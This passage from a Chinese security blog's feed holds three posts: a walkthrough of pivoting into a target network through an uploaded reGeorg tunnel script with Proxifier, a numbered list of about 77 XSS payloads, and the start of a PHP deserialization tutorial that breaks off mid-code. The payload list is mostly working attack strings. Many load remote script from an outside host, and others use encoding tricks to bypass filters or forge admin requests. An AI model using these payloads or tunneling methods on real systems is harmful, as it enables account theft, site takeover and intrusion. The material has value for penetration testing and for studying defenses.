<h2 id="reGeorg-proxifier正向代理"><a href="#reGeorg-proxifier正向代理" class="headerlink" title="reGeorg+proxifier正向代理"></a>reGeorg+proxifier正向代理</h2><p>靶机：192.168.1.117<br>本机：192.168.1.110</p>
<p>reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高一些。这也是平时用的比较多的工具。</p>
<p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python reGeorgSocksProxy.py -p 8888 -u http://192.168.1.117/tunnel.php</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg2.png" alt=""></p>
<p>将proxifier打开，在Proxy Server中这样配置<br><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg22.png" alt=""></p>
<p>右击“mstsc.exe”，选择“proxifier”-》proxy socks5 127.0.0.1进行远程连接<br><img src="http://xianzhi.aliyun.com/forum/attachment/Mon_1703/4_1369089561206498_634c5121ba88660.jpg" alt=""></p>
<p>输入内网ip，192.168.1.117</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg4.png" alt=""></p>
<p>可以看到reGeorg的状态，和proxifier的状态<br><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg3.png" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg5.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>xss payload 大全</title>
    <link href="http://uknowsec.cn/posts/notes/xss-payload-%E5%A4%A7%E5%85%A8.html"/>
    <id>http://uknowsec.cn/posts/notes/xss-payload-大全.html</id>
    <published>2017-07-11T05:20:00.000Z</published>
    <updated>2017-07-11T05:20:37.482Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div></pre></td><td class="code"><pre><div class="line">(1)普通的XSS JavaScript注入</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(2)IMG标签XSS使用JavaScript命令</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(3)IMG标签无分号无引号</div><div class="line">&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</div><div class="line"></div><div class="line">(4)IMG标签大小写不敏感</div><div class="line">&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;</div><div class="line"></div><div class="line">(5)HTML编码(必须有分号)</div><div class="line">&lt;IMG SRC=javascript:alert(“XSS”)&gt;</div><div class="line"></div><div class="line">(6)修正缺陷IMG标签</div><div class="line">&lt;IMG “”&quot;&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;</div><div class="line"></div><div class="line">(7)formCharCode标签(计算器)</div><div class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</div><div class="line"></div><div class="line">(8)UTF-8的Unicode编码(计算器)</div><div class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</div><div class="line"></div><div class="line">(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</div><div class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</div><div class="line"></div><div class="line">(10)十六进制编码也是没有分号(计算器)</div><div class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</div><div class="line"></div><div class="line">(11)嵌入式标签,将Javascript分开</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(12)嵌入式编码标签,将Javascript分开</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(13)嵌入式换行符</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(14)嵌入式回车</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(15)嵌入式多行注入JavaScript,这是XSS极端的例子</div><div class="line">&lt;IMG SRC=”javascript:alert(‘XSS‘)”&gt;</div><div class="line"></div><div class="line">(16)解决限制字符(要求同页面)</div><div class="line">&lt;script&gt;z=’document.’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’w.shell’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</div><div class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</div><div class="line"></div><div class="line">(17)空字符</div><div class="line">perl -e ‘print “&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;”;’ &gt; out</div><div class="line"></div><div class="line">(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</div><div class="line">perl -e ‘print “&lt;SCR\0IPT&gt;alert(\”XSS\”)&lt;/SCR\0IPT&gt;”;’ &gt; out</div><div class="line"></div><div class="line">(19)Spaces和meta前的IMG标签</div><div class="line">&lt;IMG SRC=”   javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(20)Non-alpha-non-digit XSS</div><div class="line">&lt;SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(21)Non-alpha-non-digit XSS to 2</div><div class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;</div><div class="line"></div><div class="line">(22)Non-alpha-non-digit XSS to 3</div><div class="line">&lt;SCRIPT/SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(23)双开括号</div><div class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(24)无结束脚本标记(仅火狐等浏览器)</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</div><div class="line"></div><div class="line">(25)无结束脚本标记2</div><div class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</div><div class="line"></div><div class="line">(26)半开的HTML/JavaScript XSS</div><div class="line">&lt;IMG SRC=”javascript:alert(‘XSS’)”</div><div class="line"></div><div class="line">(27)双开角括号</div><div class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</div><div class="line"></div><div class="line">(28)无单引号 双引号 分号</div><div class="line">&lt;SCRIPT&gt;a=/XSS/</div><div class="line">alert(a.source)&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(29)换码过滤的JavaScript</div><div class="line">\”;alert(‘XSS’);//</div><div class="line"></div><div class="line">(30)结束Title标签</div><div class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(31)Input Image</div><div class="line">&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(32)BODY Image</div><div class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(33)BODY标签</div><div class="line">&lt;BODY(‘XSS’)&gt;</div><div class="line"></div><div class="line">(34)IMG Dynsrc</div><div class="line">&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(35)IMG Lowsrc</div><div class="line">&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(36)BGSOUND</div><div class="line">&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(37)STYLE sheet</div><div class="line">&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(38)远程样式表</div><div class="line">&lt;LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”&gt;</div><div class="line"></div><div class="line">(39)List-style-image(列表式)</div><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(“javascript:alert(‘XSS’)”);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</div><div class="line"></div><div class="line">(40)IMG VBscript</div><div class="line">&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</div><div class="line"></div><div class="line">(41)META链接url</div><div class="line">&lt;META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(42)Iframe</div><div class="line">&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;</div><div class="line"></div><div class="line">(43)Frame</div><div class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;</div><div class="line"></div><div class="line">(44)Table</div><div class="line">&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(45)TD</div><div class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(46)DIV background-image</div><div class="line">&lt;DIV STYLE=”background-image: none)”&gt;</div><div class="line"></div><div class="line">(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</div><div class="line">&lt;DIV STYLE=”background-image: none)”&gt;</div><div class="line"></div><div class="line">(48)DIV expression</div><div class="line">&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”&gt;</div><div class="line"></div><div class="line">(49)STYLE属性分拆表达</div><div class="line">&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</div><div class="line"></div><div class="line">(50)匿名STYLE(组成:开角号和一个字母开头)</div><div class="line">&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</div><div class="line"></div><div class="line">(51)STYLE background-image</div><div class="line">&lt;STYLE&gt;.XSS&#123;background-image:none”);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</div><div class="line"></div><div class="line">(52)IMG STYLE方式</div><div class="line">exppression(alert(“XSS”))’&gt;</div><div class="line"></div><div class="line">(53)STYLE background</div><div class="line">&lt;STYLE&gt;&lt;STYLE type=”text/css”&gt;BODY&#123;background:url(“javascript:alert(‘XSS’)”)&#125;&lt;/STYLE&gt;</div><div class="line"></div><div class="line">(54)BASE</div><div class="line">&lt;BASE HREF=”javascript:alert(‘XSS’);//”&gt;</div><div class="line"></div><div class="line">(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</div><div class="line">&lt;EMBED SRC=”http://3w.org/XSS/xss.swf” &gt;&lt;/EMBED&gt;</div><div class="line"></div><div class="line">(56)在flash中使用ActionScrpt可以混进你XSS的代码</div><div class="line">a=”get”;</div><div class="line">b=”URL(\”&quot;;</div><div class="line">c=”javascript:”;</div><div class="line">d=”alert(‘XSS’);\”)”;</div><div class="line">eval_r(a+b+c+d);</div><div class="line"></div><div class="line">(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</div><div class="line">&lt;HTML xmlns:xss&gt;</div><div class="line">&lt;?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”&gt;</div><div class="line">&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;</div><div class="line">&lt;/HTML&gt;</div><div class="line"></div><div class="line">(58)如果过滤了你的JS你可以在图片里添加JS代码来利用</div><div class="line">&lt;SCRIPT SRC=””&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(59)IMG嵌入式命令,可执行任意命令</div><div class="line">&lt;IMG SRC=”http://www.XXX.com/a.php?a=b”&gt;</div><div class="line"></div><div class="line">(60)IMG嵌入式命令(a.jpg在同服务器)</div><div class="line">Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser</div><div class="line"></div><div class="line">(61)绕符号过滤</div><div class="line">&lt;SCRIPT a=”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(62)</div><div class="line">&lt;SCRIPT =”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(63)</div><div class="line">&lt;SCRIPT a=”&gt;” ” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(64)</div><div class="line">&lt;SCRIPT “a=’&gt;’” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(65)</div><div class="line">&lt;SCRIPT a=`&gt;` SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(66)</div><div class="line">&lt;SCRIPT a=”&gt;’&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(67)</div><div class="line">&lt;SCRIPT&gt;document.write(“&lt;SCRI”);&lt;/SCRIPT&gt;PT SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(68)URL绕行</div><div class="line">&lt;A HREF=”http://127.0.0.1/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(69)URL编码</div><div class="line">&lt;A HREF=”http://3w.org”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(70)IP十进制</div><div class="line">&lt;A HREF=”http://3232235521″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(71)IP十六进制</div><div class="line">&lt;A HREF=”http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(72)IP八进制</div><div class="line">&lt;A HREF=”http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(73)混合编码</div><div class="line">&lt;A HREF=”h</div><div class="line">tt p://6 6.000146.0×7.147/”&quot;&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(74)节省[http:]</div><div class="line">&lt;A HREF=”//www.google.com/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(75)节省[www]</div><div class="line">&lt;A HREF=”http://google.com/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(76)绝对点绝对DNS</div><div class="line">&lt;A HREF=”http://www.google.com./”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(77)javascript链接</div><div class="line">&lt;A HREF=”javascript:document.location=’http://www.google.com/’”&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>理解php序列化漏洞</title>
    <link href="http://uknowsec.cn/posts/notes/%E7%90%86%E8%A7%A3php%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html"/>
    <id>http://uknowsec.cn/posts/notes/理解php序列化漏洞.html</id>
    <published>2017-07-11T03:22:05.000Z</published>
    <updated>2017-07-11T05:41:55.169Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p>PHP对象注入是一个非常常见的漏洞，这个类型的漏洞虽然有些难以利用，但仍旧非常危险。为了理解这个漏洞，请读者具备基础的php知识。类和变量是非常容易理解的php概念。举个例子，1.php在一个类中定义了一个变量和一个方法。它创建了一个对象并且调用了PrintVariable函数，该函数会输出变量variable。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">   </div><div class="line">class TestClass  </div><div class="line">&#123;  </div><div class="line">    // 一个变量  </div><div class="line">   </div><div class="line">    public $variable = &apos;This is a string&apos;;  </div><div class="line">   </div><div class="line">    // 一个简单的方法  </div><div class="line">   </div><div class="line">    public function PrintVariable()  </div><div class="line">    &#123;  </div><div class="line">        echo $this-&gt;variable;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// 创建一个对象  </div><div class="line">   </div><div class="line">$object = new TestClass();  </div><div class="line">   </div><div class="line">// 调用一个方法  </div><div class="line">   </div><div class="line">$object-&gt;PrintVariable();  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161225214524536" alt=""></p>
<p>php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号<strong>开头的，比如 </strong>construct, <strong>destruct, </strong>toString, <strong>sleep, </strong>wakeup等等。这些函数在某些情况下会自动调用，比如<strong>construct当一个对象创建时被调用，</strong>destruct当一个对象销毁时被调用，<strong>toString当一个对象被当作一个字符串使用。为了更好的理解magic方法是如何工作的，在2.php中增加了三个magic方法，</strong>construct, <strong>destruct和</strong>toString。可以看出，<strong>construct在对象创建时调用，</strong>destruct在php脚本结束时调用，__toString在对象被当作一个字符串使用时调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">   </div><div class="line">class TestClass  </div><div class="line">&#123;  </div><div class="line">    // 一个变量  </div><div class="line">   </div><div class="line">    public $variable = &apos;This is a string&apos;;  </div><div class="line">   </div><div class="line">    // 一个简单的方法  </div><div class="line">   </div><div class="line">    public function PrintVariable()  </div><div class="line">    &#123;  </div><div class="line">        echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    // Constructor  </div><div class="line">   </div><div class="line">    public function __construct()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__construct &lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    // Destructor  </div><div class="line">   </div><div class="line">    public function __destruct()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__destruct &lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    // Call  </div><div class="line">   </div><div class="line">    public function __toString()  </div><div class="line">    &#123;  </div><div class="line">        return &apos;__toString&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// 创建一个对象  </div><div class="line">//  __construct会被调用  </div><div class="line">   </div><div class="line">$object = new TestClass();  </div><div class="line">   </div><div class="line">// 创建一个方法   </div><div class="line">   </div><div class="line">$object-&gt;PrintVariable();  </div><div class="line">   </div><div class="line">// 对象被当作一个字符串  </div><div class="line">//  __toString会被调用  </div><div class="line">   </div><div class="line">echo $object;  </div><div class="line">   </div><div class="line">// End of PHP script  </div><div class="line">// 脚本结束__destruct会被调用  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226145426730" alt=""></p>
<p>php允许保存一个对象方便以后重用，这个过程被称为序列化。为什么要有序列化这种机制呢?在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。试想，如果为一个脚本中想要调用之前一个脚本的变量，但是前一个脚本已经执行完毕，所有的变量和内容释放掉了，我们要如何操作呢?难道要前一个脚本不断的循环，等待后面脚本调用?这肯定是不现实的。serialize和unserialize就是用来解决这一问题的。serialize可以将变量转换为字符串并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串变换回变量。让我们在3.php中添加序列化的例子，看看php对象序列化之后的格式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">&lt;?php    </div><div class="line">     </div><div class="line">// 某类    </div><div class="line">     </div><div class="line">class User    </div><div class="line">&#123;    </div><div class="line">    // 类数据    </div><div class="line">     </div><div class="line">    public $age = 0;    </div><div class="line">    public $name = &apos;&apos;;    </div><div class="line">     </div><div class="line">    // 输出数据    </div><div class="line">     </div><div class="line">    public function PrintData()    </div><div class="line">    &#123;    </div><div class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age    </div><div class="line">             . &apos; years old. &lt;br /&gt;&apos;;    </div><div class="line">    &#125;    </div><div class="line">&#125;    </div><div class="line">     </div><div class="line">// 创建一个对象    </div><div class="line">     </div><div class="line">$usr = new User();    </div><div class="line">     </div><div class="line">// 设置数据    </div><div class="line">     </div><div class="line">$usr-&gt;age = 20;    </div><div class="line">$usr-&gt;name = &apos;John&apos;;    </div><div class="line">     </div><div class="line">// 输出数据    </div><div class="line">     </div><div class="line">$usr-&gt;PrintData();    </div><div class="line">     </div><div class="line">// 输出序列化之后的数据    </div><div class="line">     </div><div class="line">echo serialize($usr);    </div><div class="line">     </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226151805778" alt=""></p>
<p>为了使用这个对象，在4.php中用unserialize重建对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?php    </div><div class="line">     </div><div class="line">// 某类    </div><div class="line">     </div><div class="line">class User    </div><div class="line">&#123;    </div><div class="line">    // Class data    </div><div class="line">     </div><div class="line">    public $age = 0;    </div><div class="line">    public $name = &apos;&apos;;    </div><div class="line">     </div><div class="line">    // Print data    </div><div class="line">     </div><div class="line">    public function PrintData()    </div><div class="line">    &#123;    </div><div class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;    </div><div class="line">    &#125;    </div><div class="line">&#125;    </div><div class="line">     </div><div class="line">// 重建对象    </div><div class="line">     </div><div class="line">$usr = unserialize(&apos;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;&#125;&apos;);    </div><div class="line">     </div><div class="line">// 调用PrintData 输出数据    </div><div class="line">     </div><div 